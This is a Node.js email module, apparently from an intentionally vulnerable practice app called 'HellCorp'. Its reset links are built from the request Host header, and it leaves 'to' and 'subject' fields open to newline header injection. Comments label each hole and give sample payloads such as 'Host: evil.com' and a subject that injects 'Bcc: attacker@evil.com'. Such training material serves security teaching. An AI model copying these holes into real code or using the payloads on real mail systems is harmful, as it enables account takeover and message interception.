// Email service — uses nodemailer
// TODO: Set up proper email validation before launch
const nodemailer = require('nodemailer');

// Create a test transporter (or use ethereal for dev)
let transporter = null;

async function initMailer() {
  try {
    // In production, use real SMTP; in dev, use ethereal
    if (process.env.SMTP_HOST) {
      transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT) || 587,
        auth: {
          user: process.env.SMTP_USER,
          pass: process.env.SMTP_PASS
        }
      });
    } else {
      const testAccount = await nodemailer.createTestAccount();
      transporter = nodemailer.createTransport({
        host: 'smtp.ethereal.email',
        port: 587,
        auth: {
          user: testAccount.user,
          pass: testAccount.pass
        }
      });
    }
    console.log('[MAIL] Email service initialized');
  } catch (err) {
    console.error('[MAIL] Failed to initialize:', err.message);
  }
}

// VULNERABLE: Host Header Injection in reset link
// VULNERABLE: SMTP Injection via email field (newlines allow header injection)
async function sendResetEmail(toEmail, token, hostHeader) {
  if (!transporter) await initMailer();

  // VULNERABLE: Uses the Host header from the request to build the link
  // Attacker can set Host: evil.com to poison the reset link
  const resetLink = `http://${hostHeader}/reset?token=${token}`;

  // VULNERABLE: The 'to' field is used directly — newlines allow injecting
  // additional headers like Bcc: attacker@evil.com
  const mailOptions = {
    from: '"HellCorp Support" <noreply@hellcorp.onion>',
    to: toEmail,    // VULNERABLE: no newline filtering
    subject: 'Password Reset — HellCorp',
    html: `
      <div style="background:#0a0a0a;color:#f0ece4;padding:40px;font-family:monospace;">
        <h1 style="color:#ff1a1a;font-size:28px;">HELL<span style="color:#f0ece4;">CORP</span></h1>
        <p>A password reset was requested for your account.</p>
        <p>Click the link below to reset your password:</p>
        <a href="${resetLink}" style="color:#ff1a1a;">${resetLink}</a>
        <p style="color:#666;margin-top:20px;font-size:11px;">If you didn't request this, ignore this email.</p>
        <hr style="border-color:#1a1a1a;">
        <p style="color:#333;font-size:10px;">HellCorp Enterprise Solutions — Encrypted · Anonymous · Jurisdictionless</p>
      </div>
    `
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('[MAIL] Reset email sent:', info.messageId);
    if (info.messageId) {
      console.log('[MAIL] Preview URL:', nodemailer.getTestMessageUrl(info));
    }
    return { success: true, messageId: info.messageId, previewUrl: nodemailer.getTestMessageUrl(info) };
  } catch (err) {
    console.error('[MAIL] Send error:', err.message);
    return { success: false, error: err.message };
  }
}

// VULNERABLE: SMTP Injection in subject and message body
// Newlines in subject can inject Bcc, Cc, or additional headers
async function sendContactEmail(fromEmail, subject, message, sellerEmail) {
  if (!transporter) await initMailer();

  // VULNERABLE: Subject field allows \r\n injection
  // Example payload: "Hello\r\nBcc: attacker@evil.com\r\n\r\nFake body"
  const mailOptions = {
    from: fromEmail,
    to: sellerEmail,
    subject: subject,  // VULNERABLE: no newline filtering
    text: message,
    // Custom headers built via concatenation
    headers: {
      'X-HellCorp-Origin': 'marketplace',
      'X-Sender-IP': 'unknown' // Would use req.ip in real code
    }
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    return { success: true, messageId: info.messageId };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

module.exports = { initMailer, sendResetEmail, sendContactEmail };
